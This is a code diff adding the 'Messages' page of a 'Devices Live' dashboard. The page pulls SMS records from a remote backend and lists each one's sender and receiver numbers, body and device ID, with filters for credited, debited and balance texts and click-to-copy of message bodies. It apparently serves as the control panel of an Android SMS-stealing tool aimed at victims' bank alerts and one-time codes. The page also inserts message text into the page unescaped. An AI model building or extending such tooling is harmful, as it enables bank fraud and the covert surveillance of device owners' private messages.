@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Messages | Devices Live</title>
+
+  <link rel="icon" type="image/png" href="assets/image/android.png" />
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+  <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+
+<style>
+/* 🌍 GLOBAL */
+body {
+  font-family: 'Roboto', sans-serif;
+  margin: 0;
+  margin-top: -210px;
+  background: #f5f5f5;
+  color: #333;
+}
+
+/* 📌 COPY TOAST */
+#copyToast {
+  position: fixed;
+  bottom: 30px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: #00a14b;
+  color: white;
+  padding: 10px 20px;
+  border-radius: 8px;
+  opacity: 0;
+  transition: .3s;
+  pointer-events: none;
+  z-index: 999999;
+}
+#copyToast.show { opacity: 1; }
+
+.flashCopy {
+  animation: flashAnim .4s ease-out;
+}
+@keyframes flashAnim {
+  0% { background: yellow; }
+  100% { background: transparent; }
+}
+
+/* ⭐ LOADER */
+#loaderBox {
+  position: fixed; inset: 0;
+  background: #f5f5f5;
+  display: flex; justify-content: center; align-items: center;
+  flex-direction: column;
+  gap: 25px;
+  z-index: 999999;
+}
+.cube {
+  width: 55px; height: 55px;
+  transform-style: preserve-3d;
+  animation: cubeRotate 1.8s linear infinite;
+  position: relative;
+}
+.cube div {
+  position: absolute;
+  width: 55px; height: 55px;
+  background: #00a14b;
+  border: 2px solid white;
+  opacity: 0.9;
+}
+.cube .front { transform: rotateY(0deg) translateZ(27px); }
+.cube .back { transform: rotateY(180deg) translateZ(27px); }
+.cube .right { transform: rotateY(90deg) translateZ(27px); }
+.cube .left { transform: rotateY(-90deg) translateZ(27px); }
+.cube .top { transform: rotateX(90deg) translateZ(27px); }
+.cube .bottom { transform: rotateX(-90deg) translateZ(27px); }
+@keyframes cubeRotate {
+  0% { transform: rotateX(0) rotateY(0); }
+  100% { transform: rotateX(360deg) rotateY(360deg); }
+}
+.loading-text {
+  font-size: 20px;
+  font-weight: bold;
+  color: #00a14b;
+}
+
+/* 🔰 HEADER */
+.header {
+  background: #fff;
+  padding: 15px 10px;
+  text-align: center;
+  position: fixed; 
+  top: 0; left: 0; right: 0;
+  z-index: 1000;
+}
+.header h1 {
+  margin: 0;
+  display: flex;
+  justify-content: center; 
+  align-items: center;
+  gap: 10px;
+  font-size: 26px;
+  color: #0c6b27;
+}
+
+/* 🌐 NAVBAR */
+.nav {
+  display: flex;
+  justify-content: space-evenly;
+  align-items: center;
+  background: #000;
+  padding: 14px 0;
+  position: fixed; 
+  top: 70px; left: 0; right: 0;
+  z-index: 999;
+  border-bottom: 3px solid limegreen;
+  white-space: nowrap;
+}
+.nav a {
+  color: white;
+  padding: 12px 18px;
+  text-decoration: none;
+  font-size: 15px;
+  transition: .3s;
+}
+.nav a.active {
+    color: limegreen;
+    font-weight: 700;
+    position: relative;
+}
+.nav a.active::after {
+    content: "";
+    position: absolute;
+    bottom: -6px;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 60%;
+    height: 4px;
+    background: limegreen;
+    border-radius: 4px;
+}
+
+/* 🔍 SEARCH + FILTER BAR */
+.search-bar {
+  position: fixed; 
+  top: 130px;
+  left: 0; right: 0;
+  background: #fff;
+  z-index: 998;
+  padding: 10px 0;
+  box-shadow: 0 2px 4px rgba(0,0,0,.04);
+}
+.search-inner {
+  max-width: 750px; 
+  margin: auto;
+  display: flex;
+  gap: 10px;
+  padding: 0 12px;
+}
+.search-inner input,
+.search-inner select {
+  padding: 10px 14px;
+  font-size: 15px;
+  border-radius: 8px;
+  border: 1px solid #ccc;
+  outline: none;
+}
+.search-inner input { flex: 1; }
+.search-inner select { width: 150px; }
+
+/* 💬 MESSAGE CARDS */
+.messages-container {
+  max-width: 750px;
+  margin: 220px auto 20px;
+  padding: 0 14px;
+}
+.message-card {
+  background: white;
+  padding: 15px;
+  border-radius: 10px;
+  border: 1px solid #ccc;
+  margin-bottom: 12px;
+  box-shadow: 0 1px 3px rgba(0,0,0,.1);
+}
+.msg-body {
+  cursor: pointer;
+  font-weight: 600;
+}
+.msg-body.red { color: red; }
+.msg-body.green { color: green; }
+
+/* 📱 MOBILE */
+@media (max-width: 768px) {
+  body { padding-top: 240px; }
+  .nav a { padding: 10px 12px; font-size: 14px; }
+  .search-inner { max-width: 95%; flex-wrap: wrap; }
+  .search-inner select { flex: 1; min-width: 45%; }
+}
+</style>
+</head>
+
+<body>
+
+<div id="copyToast">Copied!</div>
+
+<div id="loaderBox">
+  <div class="cube">
+    <div class="front"></div><div class="back"></div>
+    <div class="right"></div><div class="left"></div>
+    <div class="top"></div><div class="bottom"></div>
+  </div>
+  <div class="loading-text">Loading...</div>
+</div>
+
+<header class="header">
+  <h1>Devices <span style="color:red;">Live</span></h1>
+</header>
+
+<nav class="nav">
+  <a href="messages.html" class="active">Messages</a>
+  <a href="groups.html">Data Groups</a>
+  <a href="devices.html">Devices</a>
+  <a href="setting.html">Setting</a>
+</nav>
+
+<section class="search-bar">
+  <div class="search-inner">
+    <input id="search" type="text" placeholder="Search by id / text / number..." />
+    
+    <!-- 🆕 FILTER SELECT -->
+    <select id="filter">
+      <option value="all">All Messages</option>
+      <option value="credited">Credited</option>
+      <option value="debited">Debited</option>
+      <option value="available_balance">Available Balance</option>
+      <option value="balance_related">Balance Related</option>
+    </select>
+
+    <!-- पुराना sort same रखा -->
+    <select id="sort">
+      <option value="latest">Latest</option>
+      <option value="oldest">Oldest</option>
+    </select>
+  </div>
+</section>
+
+<section class="messages-container" id="messagesList">
+  <p class="no-msg">Loading messages...</p>
+</section>
+
+<script>
+const API_URL = "https://backend-1-qcsu.onrender.com/api/notification/all";
+let allMessages = [];
+
+/* Loader hide */
+function hideLoader() {
+  document.getElementById("loaderBox").style.display = "none";
+}
+
+/* Date format */
+function formatDate(d) {
+  return new Date(d).toLocaleString("en-IN");
+}
+
+/* Banking check (existing) */
+function isBankingMessage(t) {
+  if (!t) return false;
+  const k = ["credited","debited","rs","inr","bank","account","upi","txn"];
+  t = t.toLowerCase();
+  return k.some(v => t.includes(v));
+}
+
+/* 🆕 Filter match function */
+function matchFilter(msg, filterVal) {
+  const text = (msg.body || "").toLowerCase();
+
+  switch (filterVal) {
+    case "credited":
+      return text.includes("credited") || text.includes("credit") || text.includes(" cr ");
+    case "debited":
+      return text.includes("debited") || text.includes("debit") || text.includes(" dr ");
+    case "available_balance":
+      return text.includes("available balance") ||
+             text.includes("avail bal") ||
+             text.includes("avl bal") ||
+             text.includes("available bal");
+    case "balance_related":
+      return text.includes("balance") || text.includes("bal");
+    case "all":
+    default:
+      return true;
+  }
+}
+
+/* Fetch messages */
+async function fetchAllMessages() {
+  const c = document.getElementById("messagesList");
+  c.innerHTML = `<p class="no-msg">Loading messages...</p>`;
+
+  try {
+    const res = await fetch(API_URL);
+    const data = await res.json();
+    allMessages = (data.data || []).reverse();
+    applyFiltersAndRender();        // 🆕 पहले filter + sort + search apply
+  } catch (e) {
+    c.innerHTML = `<p class="no-msg">Server Error</p>`;
+  }
+
+  hideLoader();
+}
+
+/* सिर्फ render (list मानकर) */
+function renderMessages(list) {
+  const c = document.getElementById("messagesList");
+  c.innerHTML = "";
+  if (!list || !list.length) {
+    c.innerHTML = `<p class="no-msg">No messages found.</p>`;
+    return;
+  }
+  list.forEach(m => addMessageCard(m));
+}
+
+/* 🆕 master: search + filter + sort apply */
+function applyFiltersAndRender() {
+  let list = [...allMessages];
+
+  const searchVal = document.getElementById("search").value.trim().toLowerCase();
+  const filterVal = document.getElementById("filter").value;
+  const sortVal   = document.getElementById("sort").value;
+
+  // 1) filter type
+  list = list.filter(m => matchFilter(m, filterVal));
+
+  // 2) search (body, numbers, sender, ID)
+  if (searchVal) {
+    list = list.filter(m => {
+      const body   = (m.body || "").toLowerCase();
+      const sNum   = (m.senderNumber || "").toLowerCase();
+      const rNum   = (m.receiverNumber || "").toLowerCase();
+      const sender = (m.sender || "").toLowerCase();
+      const uid    = (m.uniqueid || "").toLowerCase();   // 🆕 search by ID
+
+      return (
+        body.includes(searchVal)   ||
+        sNum.includes(searchVal)   ||
+        rNum.includes(searchVal)   ||
+        sender.includes(searchVal) ||
+        uid.includes(searchVal)
+      );
+    });
+  }
+
+  // 3) sort
+  list.sort((a, b) => {
+    const ta = new Date(a.timestamp).getTime();
+    const tb = new Date(b.timestamp).getTime();
+    return sortVal === "latest" ? (tb - ta) : (ta - tb);
+  });
+
+  // 4) render
+  renderMessages(list);
+}
+
+/* Add one card */
+function addMessageCard(m) {
+  const c = document.getElementById("messagesList");
+  const div = document.createElement("div");
+  div.className = "message-card";
+
+  div.innerHTML = `
+      <p><b>D:</b> ${formatDate(m.timestamp)}</p>
+      <p><b>A:</b> ${m.title || "-"}</p>
+      <p><b>S:</b> ${m.senderNumber || "-"}</p>
+      <p><b>R:</b> ${m.receiverNumber || "-"}</p>
+      <p><b>F:</b> ${m.sender || "-"}</p>
+
+      <p class="msg-body ${isBankingMessage(m.body) ? "green" : "red"}"
+         data-text="${(m.body || "").replace(/"/g,'&quot;')}">
+         M: ${m.body || ""}
+      </p>
+
+      <div class="msg-footer">
+         <a class="device-link" href="device-details.html?id=${m.uniqueid}">
+           ${m.uniqueid}
+         </a>
+      </div>
+  `;
+
+  // Click to copy SMS body
+  div.querySelector(".msg-body").addEventListener("click", function () {
+    copyText(this.getAttribute("data-text"), this);
+  });
+
+  c.appendChild(div);
+}
+
+/* Copy helper */
+function copyText(text, element) {
+  try {
+    navigator.clipboard.writeText(text).then(() => {
+      element.classList.add("flashCopy");
+      setTimeout(() => element.classList.remove("flashCopy"), 400);
+      showToast("Copied!");
+    });
+  } catch (e) {
+    const t = document.createElement("textarea");
+    t.value = text;
+    document.body.appendChild(t);
+    t.select();
+    document.execCommand("copy");
+    t.remove();
+    showToast("Copied!");
+  }
+}
+
+/* Toast */
+function showToast(msg) {
+  const t = document.getElementById("copyToast");
+  t.innerHTML = msg;
+  t.classList.add("show");
+  setTimeout(() => t.classList.remove("show"), 1200);
+}
+
+/* 🔁 Events: search, filter, sort */
+document.getElementById("search").addEventListener("input", applyFiltersAndRender);
+document.getElementById("filter").addEventListener("change", applyFiltersAndRender);
+document.getElementById("sort").addEventListener("change", applyFiltersAndRender);
+
+/* Start */
+fetchAllMessages();
+</script>
+
+</body>
+</html>
